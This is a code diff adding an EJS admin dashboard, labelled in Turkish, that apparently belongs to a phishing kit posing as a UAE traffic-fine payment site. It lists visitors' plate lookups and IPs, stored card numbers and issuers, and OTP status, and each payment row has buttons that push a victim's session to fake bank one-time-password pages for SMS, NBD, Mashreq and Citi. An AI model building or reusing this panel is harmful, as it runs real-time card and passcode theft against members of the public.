@@ -1,0 +1,116 @@
+<%- include('_layout', { pageTitle: 'Dashboard', activePage: 'dashboard', adminUser }) %>
+
+<% if (typeof dbError !== 'undefined' && dbError) { %>
+<div style="background:#fef2f2;border:1px solid #fecaca;padding:16px 20px;border-radius:12px;color:#dc2626;margin-bottom:20px;">
+  ⚠️ Veritabanı hatası: <%= dbError %>
+</div>
+<% } else { %>
+
+<!-- Stats -->
+<div class="stat-grid">
+  <div class="stat-card blue">
+    <div class="label">Toplam Sorgu</div>
+    <div class="value"><%= totalInquiries.toLocaleString() %></div>
+    <div class="sub">Bugün: +<%= todayInquiries %></div>
+  </div>
+  <div class="stat-card orange">
+    <div class="label">Toplam Ödeme</div>
+    <div class="value"><%= totalPayments.toLocaleString() %></div>
+    <div class="sub">Bugün: +<%= todayPayments %></div>
+  </div>
+  <div class="stat-card">
+    <div class="label">Bekleyen OTP</div>
+    <div class="value" style="color:#d97706;"><%= pendingPayments.toLocaleString() %></div>
+    <div class="sub">Onaylanan: <%= approvedPayments %></div>
+  </div>
+  <div class="stat-card green">
+    <div class="label">Toplam Tutar</div>
+    <div class="value">AED <%= Number(totalRevenue).toLocaleString() %></div>
+    <div class="sub">Tüm ödemeler</div>
+  </div>
+</div>
+
+<!-- Son Ödemeler -->
+<div class="table-card">
+  <div class="table-header">
+    <h3>💳 Son Ödemeler</h3>
+    <a href="/admin/payments" class="btn btn-gray">Tümünü Gör →</a>
+  </div>
+  <div style="overflow-x:auto;">
+  <table>
+    <thead>
+      <tr>
+        <th>Tarih</th><th>Plaka</th><th>Tutar</th><th>Kart</th><th>Banka</th><th>OTP Sayfa</th><th>Durum</th><th>İşlem</th>
+      </tr>
+    </thead>
+    <tbody>
+    <% if (recentPayments.length === 0) { %>
+    <tr><td colspan="8" style="text-align:center;padding:30px;color:#94a3b8;">Henüz ödeme kaydı yok.</td></tr>
+    <% } %>
+    <% recentPayments.forEach(function(p) {
+      const statusClass = {pending:'badge-pending',approved:'badge-approved',declined:'badge-declined',otp_received:'badge-otp'}[p.otp_status] || 'badge-pending';
+      const cardLast4 = (p.card_number||'').replace(/\s/g,'').slice(-4) || '????';
+      const dateStr = p.created_at ? new Date(p.created_at).toLocaleString('tr-TR',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
+    %>
+    <tr>
+      <td class="text-sm text-muted"><%= dateStr %></td>
+      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
+      <td><strong>AED <%= Number(p.total_fine).toLocaleString() %></strong></td>
+      <td class="mono">****<%= cardLast4 %></td>
+      <td class="text-sm"><%= p.card_issuer || '-' %></td>
+      <td><span class="badge badge-otp"><%= p.otp_page || 'otp-sms' %></span></td>
+      <td><span class="badge <%= statusClass %>"><%= p.otp_status %></span></td>
+      <td>
+        <div class="action-bar">
+          <button class="btn btn-sm btn-blue"   onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
+          <button class="btn btn-sm btn-purple"  onclick="redirect('<%= p.sid %>','otp')">NBD</button>
+          <button class="btn btn-sm btn-orange"  onclick="redirect('<%= p.sid %>','otp-mashreq')">Mashreq</button>
+          <button class="btn btn-sm btn-gray"    onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
+        </div>
+      </td>
+    </tr>
+    <% }) %>
+    </tbody>
+  </table>
+  </div>
+</div>
+
+<!-- Son Sorgular -->
+<div class="table-card">
+  <div class="table-header">
+    <h3>🔍 Son Plaka Sorguları</h3>
+    <a href="/admin/inquiries" class="btn btn-gray">Tümünü Gör →</a>
+  </div>
+  <div style="overflow-x:auto;">
+  <table>
+    <thead><tr><th>Tarih</th><th>Plaka</th><th>Ceza Sayısı</th><th>Toplam AED</th><th>IP</th></tr></thead>
+    <tbody>
+    <% if (recentInquiries.length === 0) { %>
+    <tr><td colspan="5" style="text-align:center;padding:30px;color:#94a3b8;">Henüz sorgu kaydı yok.</td></tr>
+    <% } %>
+    <% recentInquiries.forEach(function(i) {
+      const dateStr = i.created_at ? new Date(i.created_at).toLocaleString('tr-TR',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
+    %>
+    <tr>
+      <td class="text-sm text-muted"><%= dateStr %></td>
+      <td><strong><%= i.plate_src %></strong> <%= i.plate_code %> <%= i.plate_no %></td>
+      <td><%= i.fine_count %></td>
+      <td>AED <%= Number(i.total_amount).toLocaleString() %></td>
+      <td class="text-sm mono text-muted"><%= i.ip || '-' %></td>
+    </tr>
+    <% }) %>
+    </tbody>
+  </table>
+  </div>
+</div>
+
+<% } %>
+
+<script>
+function redirect(sid, page) {
+  if (!confirm(page + ' sayfasına yönlendir?')) return;
+  adminAction({act:'redirect', sid, page});
+}
+</script>
+
+<%- include('_layout_end') %>
